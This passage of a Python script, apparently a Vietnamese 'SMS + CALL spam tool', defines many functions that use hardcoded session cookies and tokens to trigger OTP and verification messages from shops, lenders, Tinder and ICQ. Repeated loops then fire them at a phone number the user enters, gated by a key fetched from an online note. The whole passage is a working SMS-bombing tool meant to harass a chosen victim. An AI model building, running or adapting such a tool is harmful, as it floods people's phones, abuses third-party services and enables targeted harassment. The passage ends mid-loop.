    }

    response = requests.post('https://api.nutifoodshop.com/client/auth/register/send', headers=headers, json=json_data)
    if 'message' in response.text:
        print(format_print("$","NUTIFOOD: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","NUTiFOOD: THẤT BẠI"))
def y360(phone):
    global thanhcong
    cookies = {
        '_gcl_au': '1.1.1985930927.1685500253',
        '_gid': 'GA1.2.326096694.1685500253',
        'amp_6e403e': 'jTngcjCrirFX_Elz6i7Gfl.Ym9kb2lxdWExODlAZ21haWwuY29t..1h1nq9n9d.1h1nq9n9h.0.1.1',
        '_gat_gtag_UA_211029013_1': '1',
        '_ga_M7ZN50PQ1V': 'GS1.1.1685506950.2.0.1685506950.0.0.0',
        '_ga': 'GA1.1.671767767.1685500253',
        '_ga_BS2V9QEV6V': 'GS1.1.1685506950.2.0.1685506950.0.0.0',
    }

    headers = {
        'authority': 'y360.vn',
        'accept': 'application/json',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
         'cookie': '_gcl_au=1.1.1985930927.1685500253; _gid=GA1.2.326096694.1685500253; amp_6e403e=jTngcjCrirFX_Elz6i7Gfl.Ym9kb2lxdWExODlAZ21haWwuY29t..1h1nq9n9d.1h1nq9n9h.0.1.1; _gat_gtag_UA_211029013_1=1; _ga_M7ZN50PQ1V=GS1.1.1685506950.2.0.1685506950.0.0.0; _ga=GA1.1.671767767.1685500253; _ga_BS2V9QEV6V=GS1.1.1685506950.2.0.1685506950.0.0.0',
        'dnt': '1',
        'origin': 'https://y360.vn',
        'referer': 'https://y360.vn/hoc/register',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone,
    }

    response = requests.post('https://y360.vn/api/v1/user/register', cookies=cookies, headers=headers, json=json_data)
    if '200' in response.text:
        print(format_print("$","Y360: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","Y360: THẤT BẠI"))
def tgdd(phone):
    global thanhcong
    cookies = {
        '_fbp': 'fb.1.1679232009409.808358055',
        '_tt_enable_cookie': '1',
        '_ttp': 'ik3XoEfe1G5qpUvJxSkt6x_ov2X',
        '_gid': 'GA1.2.363981176.1685511071',
        '_gat_UA-918185-25': '1',
        'cebs': '1',
        '_ce.s': 'v~89793a8029c5d443715079fd76d2762fb41df2f1~vpv~3~lcw~1685361221737~lcw~1685511071374',
        '_ce.clock_event': '1',
        '_ce.clock_data': '-446%2C104.28.222.73%2C1',
        'DMX_Personal': '%7B%22UID%22%3A%22d6858c724ac91441fcd713e63758af60b71dbc5f%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
        '.AspNetCore.Antiforgery.UMd7_MFqVbs': 'CfDJ8OWsBjKS6DlGsrtmU_sYztJuGkytAYdP-vIR5P0El_r00zniRA9cccmCDB92sMlpADsFP2HW8dF6TDZiwyL6sLBr6CLgxRf7wvyc7OYXUDalCYANMSg0nOaidDGIO0f2m310EwBskc8tzTy2Ss9Cm0I',
        '_gat': '1',
        'amp_6e403e': 'jTngcjCrirFX_Elz6i7Gfl.Ym9kb2lxdWExODlAZ21haWwuY29t..1h1o4k20c.1h1o4k20h.0.7.7',
        'lhc_per': 'vid|42ed9e755b395839eba6',
        'SvID': 'beline173|ZHbbr|ZHbbn',
        '_ga_TLRZMSX5ME': 'GS1.1.1685511070.8.1.1685511081.49.0.0',
        '_ga': 'GA1.1.1756884604.1679232009',
        'cebsp_': '4',
    }

    headers = {
        'authority': 'www.thegioididong.com',
        'accept': '*/*',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
         'cookie': '_fbp=fb.1.1679232009409.808358055; _tt_enable_cookie=1; _ttp=ik3XoEfe1G5qpUvJxSkt6x_ov2X; _gid=GA1.2.363981176.1685511071; _gat_UA-918185-25=1; cebs=1; _ce.s=v~89793a8029c5d443715079fd76d2762fb41df2f1~vpv~3~lcw~1685361221737~lcw~1685511071374; _ce.clock_event=1; _ce.clock_data=-446%2C104.28.222.73%2C1; DMX_Personal=%7B%22UID%22%3A%22d6858c724ac91441fcd713e63758af60b71dbc5f%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8OWsBjKS6DlGsrtmU_sYztJuGkytAYdP-vIR5P0El_r00zniRA9cccmCDB92sMlpADsFP2HW8dF6TDZiwyL6sLBr6CLgxRf7wvyc7OYXUDalCYANMSg0nOaidDGIO0f2m310EwBskc8tzTy2Ss9Cm0I; _gat=1; amp_6e403e=jTngcjCrirFX_Elz6i7Gfl.Ym9kb2lxdWExODlAZ21haWwuY29t..1h1o4k20c.1h1o4k20h.0.7.7; lhc_per=vid|42ed9e755b395839eba6; SvID=beline173|ZHbbr|ZHbbn; _ga_TLRZMSX5ME=GS1.1.1685511070.8.1.1685511081.49.0.0; _ga=GA1.1.1756884604.1679232009; cebsp_=4',
        'dnt': '1',
        'origin': 'https://www.thegioididong.com',
        'referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {
        'phoneNumber': phone,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8OWsBjKS6DlGsrtmU_sYztLpTcob9E0bxuobYVB8dQFaL0WLcVzR9YiMuozma1o6enh4tyv4srMkrU7uJwojfJ9s_8HEvT_0Z1sEf-UnWZWlSNXCEqToMluu-q6_gMQjmSzUsEbpXmX-wvTDUopOIqA',
    }

    response = requests.post(
        'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
        cookies=cookies,
        headers=headers,
        data=data,
    )
    if '200' in response.text:
        print(format_print("$","TGDD: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","TGDD: THẤT BẠI"))
def nh247(phone):
    global thanhcong
    cookies = {
        '_csrf': '973eca1396514e55d251748b39039603b1974232a85e242bfc08063f1c789d2fa%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22IKtajFXbRCbbHEdh_tLbQ4g1lmiP07IS%22%3B%7D',
        '_gcl_au': '1.1.1635282769.1685511240',
        '_gid': 'GA1.2.147827434.1685511243',
        '_gac_UA-53976512-2': '1.1685511243.CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE',
        '_gat_gtag_UA_53976512_2': '1',
        '_dc_gtm_UA-53976512-2': '1',
        'vid': '1468653',
        '_gcl_aw': 'GCL.1685511244.CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE',
        '_ga': 'GA1.1.1662212097.1685511243',
        'amp_6e403e': 'jTngcjCrirFX_Elz6i7Gfl.Ym9kb2lxdWExODlAZ21haWwuY29t..1h1o4p61l.1h1o4pa8v.0.2.2',
        '_ga_D022K7SJPP': 'GS1.1.1685511244.1.1.1685511263.41.0.0',
    }

    headers = {
        'authority': 'www.nhaphang247.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
         'cookie': '_csrf=973eca1396514e55d251748b39039603b1974232a85e242bfc08063f1c789d2fa%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22IKtajFXbRCbbHEdh_tLbQ4g1lmiP07IS%22%3B%7D; _gcl_au=1.1.1635282769.1685511240; _gid=GA1.2.147827434.1685511243; _gac_UA-53976512-2=1.1685511243.CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE; _gat_gtag_UA_53976512_2=1; _dc_gtm_UA-53976512-2=1; vid=1468653; _gcl_aw=GCL.1685511244.CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE; _ga=GA1.1.1662212097.1685511243; amp_6e403e=jTngcjCrirFX_Elz6i7Gfl.Ym9kb2lxdWExODlAZ21haWwuY29t..1h1o4p61l.1h1o4pa8v.0.2.2; _ga_D022K7SJPP=GS1.1.1685511244.1.1.1685511263.41.0.0',
        'dnt': '1',
        'origin': 'https://www.nhaphang247.com',
        'referer': 'https://www.nhaphang247.com/huong-dan-dat-hang?utm_source=google&utm_medium=keywords&utm_campaign=adwords&gclid=CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'x-csrf-token': 'ZDR1dGxJa2stfwEVBg8zCTZ3FxYkDA8DO0A5Fj19DFoIWRwkXH4iOA==',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': phone,
        'token': '03AL8dmw-olofZxzuAeuXxDdXsmyMgy6BfZMVUHf7xK_ldn11WRQ_Ni75LkYaBB2vD6rLahRgFlLdMPgGotfuclQC9lLta0nvH0h6u6LEW6HPHU5OnCPJ04S-LVh0aPxwVHlWrJOxmNdUT6P0k1R5yWtjRvp3s60NX0RZSZKFDbXYnr766alQsbLv17M_942ilwyQkv8tBP00HCjU41Hwm8oXlUYqIdVCrw7sHASCV5rlFJ0HksjIY6UX9KpFLNQfL7qmF5fTge43suFmWRhLRrKqOPTT3HwClFqSlvxn09LONUr6ntGuI82aB2okl0J18FBmhWqDZpHlhLgfLyxRq7l0Cd09GbaAZ8-RfQJ2Dc2BpLJkmCupzA-xDM_dtKicThuzA8-2Rg5FyvnSESGMtBnklPAsKfdOZTjJ4HQWhmwCBUqksS8wQuKXsGxNTnZM4LwF5eS08pp6rJFEsPMhYUgpNuKMc0il9L7Ue0bbBLvEjhusIq62MGv3TZTmpvAklikuiXrquHXYCcOb7tBqYdvTPNsR3iNWmi5y7vEsgBfY5SrZ_2R_Bq4nviqDRuB4G2jV8_9DUxp0x',
    }

    response = requests.post('https://www.nhaphang247.com/site/get-code', cookies=cookies, headers=headers, data=data)
    print(format_print("$","NH247: THÀNH CÔNG"))
    thanhcong+=1
def chay1(phone):
            i=0
            thanhcong=0
            a=0
            phone1='+84'+phone
            while a<2:
                moneyveo(phone)
                print(format_print("-",i))
                i+=1                
                kiotviet(phone)
                print(format_print("-",i))
                i+=1
                tienoi(phone)
                print(format_print("-",i))
                i+=1
                vay(phone)
                print(format_print("-",i))
                i+=1
                nh247(phone)
                print(format_print("-",i))
                i+=1
                oldvayvnd(phone)
                print(format_print("-",i))
                i+=1
                vay(phone)
                print(format_print("-",i))
                i+=1
                oldloship(phone)
                print(format_print("-",i))
                i+=1
                call(phone)
                print(format_print("-",i))
                i+=1
                oldfptshop(phone)
                print(format_print("-",i))
                i+=1
                vay(phone)
                oldzalopay(phone)
                print(format_print("-",i))
                i+=1
                tienoi(phone)
                print(format_print("-",i))
                i+=1
                nh247(phone)
                print(format_print("-",i))
                i+=1
                
                oldvayvnd(phone)
                print(format_print("-",i))
                i+=1
                
                oldloship(phone)
                print(format_print("-",i))
                i+=1
                
                oldfptshop(phone)
                print(format_print("-",i))
                i+=1
                
                oldzalopay(phone)
                print(format_print("-",i))
                i+=1
                tienoi(phone)
                print(format_print("-",i))
                i+=1                
                oldtamo(phone)
                print(format_print("-",i))
                i+=1
                call(phone)
                print(format_print("-",i))
                i+=1
                vieon(phone)
                print(format_print("-",i))
                i+=1
                
                concung(phone)
                print(format_print("-",i))
                i+=1
                
                vietid(phone)
                print(format_print("-",i))
                i+=1
                
                gotadi(phone)
                print(format_print("-",i))
                i+=1
                
                winmart(phone)
                print(format_print("-",i))
                i+=1
                tienoi(phone)
                print(format_print("-",i))
                i+=1                
                atmonline(phone)
                print(format_print("-",i))
                i+=1
                vay(phone)
                print(format_print("-",i))
                i+=1
                moneyveo(phone)
                print(format_print("-",i))
                i+=1
                call(phone)
                print(format_print("-",i))
                i+=1
                pop(phone)
                print(format_print("-",i))
                i+=1
                
                tv360(phone)
                print(format_print("-",i))
                i+=1
                
                meta(phone)
                print(format_print("-",i))
                i+=1
                
                gkitchen(phone)
                print(format_print("-",i))
                i+=1
                
                pharmacity(phone)
                print(format_print("-",i))
                i+=1
                tienoi(phone)
                print(format_print("-",i))
                i+=1                
                gkitchen(phone)
                print(format_print("-",i))
                i+=1
                
                topenland(phone)
                print(format_print("-",i))
                i+=1
                
                appota(phone)
                print(format_print("-",i))
                i+=1
                
                mocha(phone)
                print(format_print("-",i))
                i+=1
                
                vntrip(phone)
                print(format_print("-",i))
                i+=1
                tienoi(phone)
                print(format_print("-",i))
                i+=1                
                tiki(phone)
                print(format_print("-",i))
                i+=1
                
                moca(phone)
                print(format_print("-",i))
                i+=1
                vay(phone)
                print(format_print("-",i))
                i+=1
                moneyveo(phone)
                print(format_print("-",i))
                i+=1
                call(phone)
                print(format_print("-",i))
                i+=1
                google(phone)
                print(format_print("-",i))
                i+=1
                
                popeyes(phone)
                print(format_print("-",i))
                i+=1
                
                best_express(phone)
                print(format_print("-",i))
                i+=1
                tienoi(phone)
                print(format_print("-",i))
                i+=1                
                onlandtech(phone)
                print(format_print("-",i))
                i+=1
                
                meeyland(phone)
                print(format_print("-",i))
                i+=1
                
                king_food(phone)
                print(format_print("-",i))
                i+=1
                
                poca(phone)
                print(format_print("-",i))
                i+=1
                
                nutifood(phone)
                print(format_print("-",i))
                i+=1
                tienoi(phone)
                print(format_print("-",i))
                i+=1                
                y360(phone)
                print(format_print("-",i))
                i+=1
                a+=1
                
                myviettel(phone)
                print(format_print("-",i))
                i+=1
                a+=1
                
                facebook(phone)
                print(format_print("-",i))
                a+=1
                i+=1
                
                oldfacebook(phone)
                print(format_print("-",i))
                a+=1
                i+=1
                vay(phone)
                print(format_print("-",i))
                i+=1
                moneyveo(phone)
                print(format_print("-",i))
                i+=1
                call(phone)
                print(format_print("-",i))
                i+=1
                try:
                    print(format_print("$",requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":phone1})))
                    tienoi(phone)
                    print(format_print("-",i))
                    i+=1
                except:
                    print(format_print("$","Không Thành Công."))
            #2
                try:
                    print(format_print("$",requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', json= {"phone_number":phone1})))
                    
                except:
                    print(format_print("$","Không Thành Công."))
            #3
                try:
                    print(format_print("$",requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php/?msisdn={}&locale=en&countryCode=ru&k=ic1rtwz1s1Hj1O0r&version=1&r=46763'.format(num))))
                    
                except:
                    print(format_print("$","Không Thành Công."))
                  
blue = Col.light_blue
lblue = Colors.StaticMIX((Col.light_green, Col.white, Col.white))
red = Colors.StaticMIX((Col.green, Col.white, Col.white))
def format_print(symbol, text):
    return f"""                      {Col.Symbol(symbol, lblue, blue)} {lblue}{text}{Col.reset}"""

def format_input(symbol, text):
    return f"""                      {Col.Symbol(symbol, red, blue)} {red}{text}{Col.reset}"""
def Banner():
    os.system("cls" if os.name == "nt" else "clear")
    title = """\n\n\n
          Nam~Tool       
"""
    banner ="""
            \033[1;35m╭─⋞─────────────────────────────────────────────────────╮
            \033[1;31m███╗   ██╗ █████╗ ███╗   ███╗    ████████╗ ██████╗  ██████╗ ██╗                  
            \033[1;32m████╗  ██║██╔══██╗████╗ ████║    ╚══██╔══╝██╔═══██╗██╔═══██╗██║                  
            \033[1;33m██╔██╗ ██║███████║██╔████╔██║       ██║   ██║   ██║██║   ██║██║                  
            \033[1;34m██║╚██╗██║██╔══██║██║╚██╔╝██║       ██║   ██║   ██║██║   ██║██║                  
            \033[1;35m██║ ╚████║██║  ██║██║ ╚═╝ ██║       ██║   ╚██████╔╝╚██████╔╝███████╗             
            \033[1;36m╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝  
            \033[1;35m Youtube : \033[1;37mhttps://youtube.com/@NamTool1
            \033[1;35m Nhóm Zalo : \033[1;37mhttps://zalo.me/g/kfmgqm225
            \033[1;35m Facebook   : \033[1;37mhttps://facebook.com/nam.nhn131
            \033[1;35m╰─────────────────────────────────────────────────────⋟─╯ 
            \033[1;37m    TOOL SPAM SMS + CALL V2
            \033[1;35m╰─────────────────────────────────────────────────────⋟─╯
\033[0;31m<=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=>\n"""
    print(Colorate.Vertical(Colors.DynamicMIX((Col.light_blue, Col.light_red)), Center.XCenter(title.center(100))) + Colorate.Vertical(Colors.DynamicMIX((Col.light_red, Col.light_blue)), Center.XCenter(banner.center(100))))
def Banner1():
    os.system("cls" if os.name == "nt" else "clear")
    title = """\n\n\n
         Nam Tool
"""
    banner ="""
            \033[1;36m╭─⋞─────────────────────────────────────────────────────╮
            \033[1;31m███╗   ██╗ █████╗ ███╗   ███╗    ██████  ███████╗██╗   ██╗          
            \033[1;32m████╗  ██║██╔══██╗████╗ ████║    ██╔══██╗██╔════╝██║   ██║          
            \033[1;33m██╔██╗ ██║███████║██╔████╔██║    ██║  ██║█████╗  ╚██╗ ██╔╝          
            \033[1;34m██║╚██╗██║██╔══██║██║╚██╔╝██║    ██║  ██║██╔══╝   ╚████╔╝           
            \033[1;35m██║ ╚████║██║  ██║██║ ╚═╝ ██║    ██████╔╝███████╗  ╚██╔╝            
            \033[1;36m╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝    ╚═════╝ ╚══════╝   ╚═╝   
            \033[1;34m Youtube : \033[1;37mhttps://youtube.com/@NamTool1
            \033[1;34m Nhóm Zalo : \033[1;37mhttps://zalo.me/g/kfmgqm225
            \033[1;34m Facebook   : \033[1;37mhttps://facebook.com/nam.nhn131 
            \033[1;36m╰─────────────────────────────────────────────────────⋟─╯ 
            \033[1;31m    TOOL SPAM SMS + CALL V2
            \033[1;36m╰─────────────────────────────────────────────────────⋟─╯
\033[0;31m<=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=>\n"""
    print(Colorate.Vertical(Colors.DynamicMIX((Col.light_blue, Col.light_green)), Center.XCenter(title.center(100))) + Colorate.Vertical(Colors.DynamicMIX((Col.light_green, Col.light_green)), Center.XCenter(banner.center(100))))
##  Không Được Thay Đổi
sdt=['0945521196'] ## sdt này không nên gọi...
def alo123():
  b=''
  
  if key == b:
      print(format_print("?","Key Đúng"))
      import os
      import requests, json
      import uuid
      import time, random, string
      import time
      time.sleep(0)
      Banner()
      def chay():
          global phone
          phone=input(format_input("+","Nhập Số Điện Thoại Cần SPAM: "))
          if phone in sdt:
              print(format_print("$","Cảnh Báo: Bạn Đang Spam Vào Số Chính Phủ, Vui Lòng Dừng Việc Đó Lại, Nếu Có Chuyện Gì Chúng Tôi Sẽ Không Chịu Trách Nhiệm. Lưu Ý Nếu Bạn Còn Tái Phạm Hành Vi Này Nữa Chúng Tôi Sẽ Khóa Key Và Cấm Bạn Dùng Tool Trong Sever Của Chúng Tôi"))
              phone='0123456789'
          phone1='+84'+phone
          a=0
          phone1='+84'+phone
          a=0
          i=0
          while a<2:
              moneyveo(phone)
              print(format_print("-",i))
              i+=1                
              kiotviet(phone)
              print(format_print("-",i))
              i+=1
              tienoi(phone)
              print(format_print("-",i))
              i+=1
              vay(phone)
              print(format_print("-",i))
              i+=1
              nh247(phone)
              print(format_print("-",i))
              i+=1
              oldvayvnd(phone)
              print(format_print("-",i))
              i+=1
              vay(phone)
              print(format_print("-",i))
              i+=1
              oldloship(phone)
              print(format_print("-",i))
              i+=1
              call(phone)
              print(format_print("-",i))
              i+=1
              oldfptshop(phone)
              print(format_print("-",i))
              i+=1
              vay(phone)
              oldzalopay(phone)
              print(format_print("-",i))
              i+=1
              tienoi(phone)
              print(format_print("-",i))
              i+=1
              nh247(phone)
              print(format_print("-",i))
              i+=1
              
              oldvayvnd(phone)
              print(format_print("-",i))
              i+=1
              
              oldloship(phone)
              print(format_print("-",i))
              i+=1
              
              oldfptshop(phone)
              print(format_print("-",i))
              i+=1
              
              oldzalopay(phone)
              print(format_print("-",i))
              i+=1
              tienoi(phone)
              print(format_print("-",i))
              i+=1                
              oldtamo(phone)
              print(format_print("-",i))
              i+=1
              call(phone)
              print(format_print("-",i))
              i+=1
              vieon(phone)
              print(format_print("-",i))
              i+=1
              
              concung(phone)
              print(format_print("-",i))
              i+=1
              
              vietid(phone)
              print(format_print("-",i))
              i+=1
              
              gotadi(phone)
              print(format_print("-",i))
              i+=1
              
              winmart(phone)
              print(format_print("-",i))
              i+=1
              tienoi(phone)
              print(format_print("-",i))
              i+=1                
              atmonline(phone)
              print(format_print("-",i))
              i+=1
              vay(phone)
              print(format_print("-",i))
              i+=1
              moneyveo(phone)
              print(format_print("-",i))
              i+=1
              call(phone)
              print(format_print("-",i))
              i+=1
              pop(phone)
              print(format_print("-",i))
              i+=1
              
              tv360(phone)
              print(format_print("-",i))
              i+=1
              
              meta(phone)
              print(format_print("-",i))
              i+=1
              
              gkitchen(phone)
              print(format_print("-",i))
              i+=1
              
              pharmacity(phone)
              print(format_print("-",i))
              i+=1
              tienoi(phone)
              print(format_print("-",i))
              i+=1                
              gkitchen(phone)
              print(format_print("-",i))
              i+=1
              
              topenland(phone)
              print(format_print("-",i))
              i+=1
              
              appota(phone)
              print(format_print("-",i))
              i+=1
              
              mocha(phone)
              print(format_print("-",i))
              i+=1
              
              vntrip(phone)
              print(format_print("-",i))
              i+=1
              tienoi(phone)
              print(format_print("-",i))
              i+=1                
              tiki(phone)
              print(format_print("-",i))
              i+=1
              
              moca(phone)
              print(format_print("-",i))
              i+=1
              vay(phone)
              print(format_print("-",i))
              i+=1
              moneyveo(phone)
              print(format_print("-",i))
              i+=1
              call(phone)
              print(format_print("-",i))
              i+=1
              google(phone)
              print(format_print("-",i))
              i+=1
              
              popeyes(phone)
              print(format_print("-",i))
              i+=1
              
              best_express(phone)
              print(format_print("-",i))
              i+=1
              tienoi(phone)
              print(format_print("-",i))
              i+=1                
              onlandtech(phone)
              print(format_print("-",i))
              i+=1
              
              meeyland(phone)
              print(format_print("-",i))
              i+=1
              
              king_food(phone)
              print(format_print("-",i))
              i+=1
              
              poca(phone)
              print(format_print("-",i))
              i+=1
              
              nutifood(phone)
              print(format_print("-",i))
              i+=1
              tienoi(phone)
              print(format_print("-",i))
              i+=1                
              y360(phone)
              print(format_print("-",i))
              i+=1
              a+=1
              
              myviettel(phone)
              print(format_print("-",i))
              i+=1
              a+=1
              
              facebook(phone)
              print(format_print("-",i))
              a+=1
              i+=1
              
              oldfacebook(phone)
              print(format_print("-",i))
              a+=1
              i+=1
              vay(phone)
              print(format_print("-",i))
              i+=1
              moneyveo(phone)
              print(format_print("-",i))
              i+=1
              call(phone)
              print(format_print("-",i))
              i+=1
              try:
                  print(format_print("$",requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":phone1})))
                  tienoi(phone)
                  print(format_print("-",i))
                  i+=1
              except:
                  print(format_print("$","Không Thành Công."))
          #2
              try:
                  print(format_print("$",requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', json= {"phone_number":phone1})))
                  
              except:
                  print(format_print("$","Không Thành Công."))
          #3
              try:
                  print(format_print("$",requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php/?msisdn={}&locale=en&countryCode=ru&k=ic1rtwz1s1Hj1O0r&version=1&r=46763'.format(num))))
                  
              except:
                  print(format_print("$","Không Thành Công."))
      chay()
      os.system('cls')
      Banner()
      print((format_print("*"," Spam Sau Gần 2 Phút, Số Lần Thành Công Là: ")),thanhcong)
      tung=0
      while tung==0:
          chay1(phone)
          os.system('cls')
          Banner()
          print((format_print("*"," Spam Sau Gần 2 Phút, Số Lần Thành Công Là: ")),thanhcong)
  while key!=b:
      print(format_print("$","Key Sai"))
      import requests
      import re
      def center_text(text):
          terminal_width = 80  # Giá trị cố định, thay đổi nếu cần
          padding = (terminal_width - len(text)) // 2
          centered_text = ' ' * padding + text
          return centered_text
      b=''
        ## điền sdt không muốn spam 
      import requests
      from html import unescape

      response = requests.get('https://anotepad.com/notes/fm8jcx6g')
      text = response.text

      start_index = text.find('&#39;')
      if start_index != -1:
          end_index = text.find('&#39;', start_index + 1)
          if end_index != -1:
              b = text[start_index + 5:end_index]
              b = unescape(b)
          if key ==b:
              print(format_print("?","Key Đúng"))
              import os
              import requests, json
              import uuid
              import time, random, string
              import time
              os.system('cls')
              Banner()
              def chay():
                  global phone
                  phone=input(format_input("+","Nhập Số Điện Thoại Cần SPAM: "))
                  if phone in sdt:
                      print(format_print("$","Cảnh Báo: Bạn Đang Spam Vào Số Chính Phủ, Vui Lòng Dừng Việc Đó Lại, Nếu Có Chuyện Gì Chúng Tôi Sẽ Không Chịu Trách Nhiệm. Lưu Ý Nếu Bạn Còn Tái Phạm Hành Vi Này Nữa Chúng Tôi Sẽ Khóa Key Và Cấm Bạn Dùng Tool Trong Sever Của Chúng Tôi"))
                      phone='0123456789'
                  phone1='+84'+phone
                  a=0
                  phone1='+84'+phone
                  a=0
                  i=0
                  while a<2:
                      moneyveo(phone)
                      print(format_print("-",i))
                      i+=1                
                      kiotviet(phone)
                      print(format_print("-",i))
                      i+=1
                      tienoi(phone)
                      print(format_print("-",i))
                      i+=1
                      vay(phone)
                      print(format_print("-",i))
                      i+=1
                      nh247(phone)
                      print(format_print("-",i))
                      i+=1
                      oldvayvnd(phone)
                      print(format_print("-",i))
                      i+=1
                      vay(phone)
                      print(format_print("-",i))
                      i+=1
                      oldloship(phone)
                      print(format_print("-",i))
                      i+=1
                      call(phone)
                      print(format_print("-",i))
                      i+=1
                      oldfptshop(phone)
                      print(format_print("-",i))
                      i+=1
                      vay(phone)
                      oldzalopay(phone)
                      print(format_print("-",i))
                      i+=1
                      tienoi(phone)
                      print(format_print("-",i))
                      i+=1
                      nh247(phone)
                      print(format_print("-",i))
                      i+=1
                      
                      oldvayvnd(phone)
                      print(format_print("-",i))
                      i+=1
                      
                      oldloship(phone)
                      print(format_print("-",i))
                      i+=1
                      
                      oldfptshop(phone)
                      print(format_print("-",i))
                      i+=1
                      
                      oldzalopay(phone)
                      print(format_print("-",i))
                      i+=1
                      tienoi(phone)
                      print(format_print("-",i))
                      i+=1                
                      oldtamo(phone)
                      print(format_print("-",i))
                      i+=1
                      call(phone)
                      print(format_print("-",i))
                      i+=1
                      vieon(phone)
                      print(format_print("-",i))
                      i+=1
                      
                      concung(phone)
                      print(format_print("-",i))
                      i+=1
                      
                      vietid(phone)
                      print(format_print("-",i))
                      i+=1
                      
                      gotadi(phone)
                      print(format_print("-",i))
                      i+=1
                      
                      winmart(phone)
                      print(format_print("-",i))
                      i+=1
                      tienoi(phone)
                      print(format_print("-",i))
                      i+=1                
